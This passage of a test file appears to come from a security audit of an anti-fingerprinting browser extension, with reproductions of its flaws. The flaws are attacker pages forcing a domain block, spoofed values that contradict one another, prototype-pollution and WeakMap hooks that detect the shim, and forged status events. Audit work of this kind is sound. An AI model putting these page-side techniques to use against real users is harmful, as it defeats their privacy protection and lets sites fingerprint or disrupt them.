    .replace(/\/\/.*$/gm, '').split(',').map((x) => x.trim().replace(/'/g, '')).filter(Boolean);
  const a = new Set(shimTable), b = new Set(heurTable);
  const onlyShim = [...a].filter((x) => !b.has(x)), onlyHeur = [...b].filter((x) => !a.has(x));
  assert.ok(onlyShim.length + onlyHeur.length > 0, 'the tables have converged — retire this test');
  assert.equal(onlyShim.length + onlyHeur.length, 41, `drift: shim-only ${onlyShim.join(',')} | sw-only ${onlyHeur.join(',')}`);
});

// ═══════════════════════════════════════════════════════════════════════════
// A5 — heuristics: three attacker pages can get an arbitrary domain blocked
// ═══════════════════════════════════════════════════════════════════════════

test('A5 REPRO: an ID-bearing query string from three attacker-controlled sites promotes a victim domain to a dynamic block rule', async () => {
  await H.reset();
  dynamicRuleCalls.length = 0;
  const onBeforeRequest = webRequestListeners.onBeforeRequest;
  assert.equal(typeof onBeforeRequest, 'function', 'heuristics.install() registered the observer');
  // github.io subdomains are (correctly) separate registrable domains — three free
  // pages are three "unrelated first parties". The URL is entirely the attacker's.
  for (const site of ['a1.github.io', 'a2.github.io', 'a3.github.io']) {
    onBeforeRequest({ tabId: 1, type: 'image', url: 'https://cdn.victim.example/logo.png?gclid=' + 'Q7'.repeat(12), initiator: `https://${site}` });
  }
  for (let i = 0; i < 20 && (await H.getState()).find((d) => d.domain === 'victim.example')?.status !== 'blocked'; i++) {
    await new Promise((r) => setTimeout(r, 5));
  }
  const rec = (await H.getState()).find((d) => d.domain === 'victim.example');
  assert.equal(rec?.status, 'blocked', 'THE FINDING: victim.example is now blocked for this user, everywhere it appears as a third party');
  const rule = dynamicRuleCalls.flatMap((c) => c.addRules ?? []).find((r) => r.condition?.requestDomains?.[0] === 'victim.example');
  assert.equal(rule?.action?.type, 'block');
  await H.reset();
});

// ═══════════════════════════════════════════════════════════════════════════
// B — contradictions an unspoofed surface exposes
// ═══════════════════════════════════════════════════════════════════════════

test('B1 REPRO: navigator.language is pinned to en-US while Intl / toLocaleString stay real (run under LANG=de_DE)', () => {
  const child = `
    import fs from 'node:fs'; import vm from 'node:vm'; import { webcrypto } from 'node:crypto';
    const SHIM = fs.readFileSync(${JSON.stringify(path.join(HERE, 'shim.js'))}, 'utf8');
    class ET { addEventListener() {} removeEventListener() {} dispatchEvent() { return true; } }
    class CE { constructor(t, i) { this.type = t; this._d = i && i.detail; } }
    Object.defineProperty(CE.prototype, 'detail', { get() { return this._d; }, configurable: true });
    class Navigator {}
    Object.defineProperty(Navigator.prototype, 'language', { get() { return 'de-DE'; }, configurable: true });
    Object.defineProperty(Navigator.prototype, 'languages', { get() { return Object.freeze(['de-DE', 'de']); }, configurable: true });
    Object.defineProperty(Navigator.prototype, 'platform', { get() { return 'MacIntel'; }, configurable: true });
    const doc = new ET(); doc.createElement = () => ({});
    const ctx = vm.createContext({ document: doc, EventTarget: ET, CustomEvent: CE, Navigator, navigator: Object.create(Navigator.prototype),
      location: { hostname: 'example.test', origin: 'https://example.test' }, crypto: { getRandomValues: (a) => webcrypto.getRandomValues(a) },
      console: { log() {}, warn() {}, error() {} } });
    vm.runInContext(SHIM, ctx);
    console.log(JSON.stringify({
      language: ctx.navigator.language, languages: ctx.navigator.languages,
      intl: vm.runInContext('Intl.DateTimeFormat().resolvedOptions().locale', ctx),
      number: vm.runInContext('(1234.5).toLocaleString()', ctx),
      date: vm.runInContext('new Date(Date.UTC(2026, 8, 16)).toLocaleDateString(undefined, { timeZone: "UTC" })', ctx),
    }));
  `;
  const out = JSON.parse(execFileSync(process.execPath, ['--input-type=module', '-e', child], {
    env: { ...process.env, LANG: 'de_DE.UTF-8', LC_ALL: 'de_DE.UTF-8' }, encoding: 'utf8',
  }).trim());
  assert.equal(out.language, 'en-US', 'the shim pins navigator.language');
  assert.deepEqual(out.languages, ['en-US', 'en']);
  assert.equal(out.intl, 'de-DE', 'THE FINDING: Intl still reports the real locale');
  assert.equal(out.number, '1.234,5', 'and number formatting is German next to an en-US navigator');
  assert.equal(out.date, '16.9.2026');
});

test('B2 REPRO: the persona pins Chrome 151 in JS regardless of the real Chrome (152 here); nothing rewrites the UA / Client-Hint headers', () => {
  const s = bootRealm(); // host navigator says Chrome/152
  assert.match(s.ua(), /Chrome\/151\.0\.0\.0/, 'fallback persona reports 151');
  const brands = s.page('navigator.userAgentData.brands.map((b) => b.brand + "/" + b.version).join(" ")');
  assert.match(brands, /Chromium\/151 Google Chrome\/151/);
  assert.match(s.h.REAL.userAgent, /Chrome\/152/, 'the browser will send Chrome/152 in User-Agent and Sec-CH-UA on every request');
  // Static half: no rule or code path touches those request headers.
  const shipped = fs.readdirSync(path.join(EXT, 'rules')).filter((f) => f.endsWith('.json'))
    .map((f) => fs.readFileSync(path.join(EXT, 'rules', f), 'utf8')).join('\n')
    + fs.readdirSync(HERE).filter((f) => f.endsWith('.js') && !f.includes('.test.')).map((f) => src(f)).join('\n');
  assert.doesNotMatch(shipped, /user-agent|sec-ch-ua/i, 'THE FINDING: header and JS disagree the moment Chrome updates');
});

test('B3a REPRO: an about:blank / srcdoc child is keyed on location.origin (a URL string), not the parent\'s eTLD+1', () => {
  const PEPPER = 'nullecho-fallback-v1';
  const triple = (s) => `${s.ctx.navigator.hardwareConcurrency}/${s.ctx.navigator.deviceMemory}`;
  // Find a site where the two keys land on different personas (≈80% of sites do).
  let site = null;
  for (const cand of ['news.example', 'shop.example', 'bank.example', 'video.example', 'mail.example', 'forum.example']) {
    if (personaFor(PEPPER, cand, 'mac').id !== personaFor(PEPPER, `https://www.${cand}`, 'mac').id) { site = cand; break; }
  }
  assert.ok(site, 'no candidate differed — statistically implausible, check personaFor');
  const parent = bootRealm({ hostname: `www.${site}`, origin: `https://www.${site}` });
  const child = bootRealm({ hostname: '', origin: `https://www.${site}` }); // about:blank inherits the origin, hostname is ''
  const expectParent = personaFor(PEPPER, site, 'mac');
  const expectChild = personaFor(PEPPER, `https://www.${site}`, 'mac');
  assert.equal(triple(parent), `${expectParent.cores}/${expectParent.memory}`, 'parent fallback = personaFor(pepper, eTLD+1)');
  assert.equal(triple(child), `${expectChild.cores}/${expectChild.memory}`, 'child fallback = personaFor(pepper, origin URL string)');
  assert.notEqual(triple(parent), triple(child), 'THE FINDING: same-origin parent and child present different machines');
});

test('B3b REPRO: the service worker refuses about:blank / about:srcdoc senders, so the child can never upgrade to the parent\'s persona', async () => {
  assert.equal(BG.siteKeyFor('about:blank'), '');
  assert.equal(BG.siteKeyFor('about:srcdoc'), '');
  const res = await swMessage({ type: 'nullecho:get-persona' }, { url: 'about:blank', origin: 'https://www.news.example' });
  assert.deepEqual(res, { ok: false, error: 'unsupported scheme' }, 'sender.url wins over sender.origin, and about: is unsupported');
});

test('B4 REPRO: silence is noised — getByteFrequencyData on an all-zero analyser returns 1s', () => {
  const s = bootRealm();
  s.upgrade();
  const out = s.page('const a = new AnalyserNode(); const u = new Uint8Array(1024); a.getByteFrequencyData(u); Array.from(u).filter((v) => v !== 0).length');
  assert.ok(out > 0, 'THE FINDING: a silent spectrum has non-zero bins (never true in a real browser)');
});

test('B5 REPRO: a transparent sub-rectangle reads un-noised while the same region inside a full read is noised', () => {
  const s = bootRealm();
  s.upgrade();
  const c = s.canvas(32, 32);
  const ctx = c.getContext('2d');
  ctx.fillStyle = 'rgb(200,30,30)'; ctx.fillRect(16, 16, 16, 16); // ink only bottom-right
  const corner = ctx.getImageData(0, 0, 8, 8).data;
  assert.ok(corner.every((v) => v === 0), 'sub-rect of the transparent corner: no ink → kernel skips → zeros');
  const full = ctx.getImageData(0, 0, 32, 32).data;
  const cornerOfFull = [];
  for (let r = 0; r < 8; r++) for (let col = 0; col < 8; col++) for (let k = 0; k < 4; k++) cornerOfFull.push(full[((r * 32) + col) * 4 + k]);
  assert.ok(cornerOfFull.some((v) => v !== 0), 'THE FINDING: the same pixels inside a full read carry noise — two reads of one region disagree');
});

test('B6 REPRO: WebGPU architecture is one constant per vendor, so Iris Xe → "gen-9" and RTX 4060 → "ampere"', () => {
  const arch = (persona) => {
    const s = bootRealm();
    s.upgrade(persona);
    return s.page('Object.create(GPUAdapterInfo.prototype).architecture');
  };
  const xe = PERSONAS.find((p) => p.id === 'win11-chrome-iris-xe');
  const rtx4060 = PERSONAS.find((p) => p.id === 'win11-chrome-rtx4060');
  const withNoise = (p) => ({ ...p, fontList: ['Arial'], noise: { canvas: 0.2, audio: 0.3, webgl: 0.4 }, seed: 1 });
  assert.equal(arch(withNoise(xe)), 'gen-9', 'Tiger Lake Xe is Gen12 (Chrome reports "gen-12lp"); the shim says gen-9');
  assert.equal(arch(withNoise(rtx4060)), 'ampere', 'RTX 4060 is Ada Lovelace; the shim says ampere');
});

test('B7 REPRO: navigator.languages and userAgentData.brands return a fresh array per read (Chrome returns the same FrozenArray)', () => {
  const s = bootRealm();
  const before = s.page('navigator.languages === navigator.languages && navigator.userAgentData.brands === navigator.userAgentData.brands');
  assert.equal(before, false, 'THE FINDING: identity across two reads is false under the shim');
  // Control: the unshimmed fakes behave like Chrome.
  const control = vm.createContext({ console });
  vm.runInContext(DOM_SETUP, control);
  assert.equal(vm.runInContext('navigator.languages === navigator.languages && navigator.userAgentData.brands === navigator.userAgentData.brands', control), true);
});

test('B8 REPRO: maxTouchPoints is pinned to 0 while the touch-event surface stays real', () => {
  const s = bootRealm({ extraGlobals: { ontouchstart: null, TouchEvent: class TouchEvent {} } });
  assert.equal(s.ctx.navigator.maxTouchPoints, 0);
  assert.equal(s.page('"ontouchstart" in globalThis && typeof TouchEvent === "function"'), true,
    'THE FINDING: a touch-screen laptop reports zero touch points next to a live touch-event surface');
});

test('B9 REPRO: Object.prototype.dev = true makes the GENUINE handshake install window.__nullechoDev', () => {
  const s = bootRealm();
  s.page('Object.prototype.dev = true;');
  s.upgrade();
  s.page('delete Object.prototype.dev;');
  assert.equal(s.page('typeof __nullechoDev'), 'object', 'THE FINDING: a production page grew the dev global');
  assert.equal(s.page('__nullechoDev.persona.id'), DELIVERED.id);
  assert.equal(s.page('__nullechoDev.version'), '0.1.0');
});

// ═══════════════════════════════════════════════════════════════════════════
// C — integrity of what the popup is told
// ═══════════════════════════════════════════════════════════════════════════

test('C1 REPRO: the MAIN→ISOLATED reverse channel is unauthenticated — a page forges nonce-exposed, a healthy status, and FP counts', async () => {
  const toWorker = [];
  const listeners = [];
  const document = {
    addEventListener: (type, fn) => listeners.push({ type, fn }),
    readyState: 'interactive', scripts: { length: 3 },
  };
  class Ev { constructor(type, init) { this.type = type; this.detail = init.detail; } }
  const dispatch = (type, obj) => { for (const l of listeners) if (l.type === type) l.fn(new Ev(type, { detail: JSON.stringify(obj) })); };
  const iso = vm.createContext({
    document, setTimeout, clearTimeout, console: { warn() {}, error() {} },
    chrome: { runtime: { id: 'x', lastError: undefined, sendMessage(m, cb) { toWorker.push(m); if (cb) setTimeout(() => cb({ ok: true, enabled: true, gpc: true, site: 'x', persona: DELIVERED }), 1); } } },
  });
  iso.self = iso.top = vm.runInContext('globalThis', iso);
  vm.runInContext(LOADER_SRC, iso);
  // A page script — no nonce, no shim involvement — dispatches on the page's own document:
  dispatch('nullecho:status', { phase: 'boot', channel: 'gpc' });                       // → false "nonce-exposed"
  dispatch('nullecho:status', { upgraded: true, lockedToFallback: false, reason: null }); // → overwrites lastShimStatus
  dispatch('nullecho:detect', { api: 'canvas', count: 1e6 });                             // → +1,000,000 "fingerprinting reads"
  const reasons = toWorker.filter((m) => m.type === 'nullecho:shim-status').map((m) => m.reason ?? (m.upgraded ? 'upgraded' : 'ok'));
  assert.ok(reasons.includes('nonce-exposed'), 'THE FINDING: a page-forged boot event raised the sticky nonce-exposed warning');
  assert.ok(reasons.includes('upgraded'), 'a page-forged status was forwarded verbatim');
  assert.ok(toWorker.some((m) => m.type === 'nullecho:fp-detected' && m.count === 1e6), 'a page-forged detect count was forwarded verbatim');
});

test('C2 REPRO: hooking WeakMap.prototype.get exposes NATIVE_SRC — a membership oracle for every patched function', () => {
  const s = bootRealm();
  const out = s.page(`
    let map = null;
    const origGet = WeakMap.prototype.get;
    WeakMap.prototype.get = function (k) { map = this; return origGet.call(this, k); };
    try { (function () {}).toString(); } finally { WeakMap.prototype.get = origGet; }
    const has = (fn) => WeakMap.prototype.has.call(map, fn);
    ({
      gotMap: map instanceof WeakMap,
      patchedUA: has(Object.getOwnPropertyDescriptor(Navigator.prototype, 'userAgent').get),
      patchedToDataURL: has(HTMLCanvasElement.prototype.toDataURL),
      untouched: has(Array.prototype.push),
    });
  `);
  assert.deepEqual(plain(out), { gotMap: true, patchedUA: true, patchedToDataURL: true, untouched: false },
    'THE FINDING: certain, false-positive-free detection of every function the shim replaced');
});

test('C3 REPRO: the heuristics layer waits for a nullecho:signal message that no file ever sends (CANVAS / SUPERCOOKIE strikes are dead)', () => {
  const senders = fs.readdirSync(HERE).filter((f) => f.endsWith('.js') && !f.includes('.test.') && f !== 'heuristics.js')
    .filter((f) => src(f).includes('nullecho:signal'));
  assert.deepEqual(senders, [], 'THE FINDING: handleContentReport() is unreachable — the shim reports nullecho:fp-detected, which only bumps a counter');
  assert.equal(H.handleContentReport({ type: 'nullecho:fp-detected', api: 'canvas', count: 1 }, { url: 'https://x.example' }), false);
});
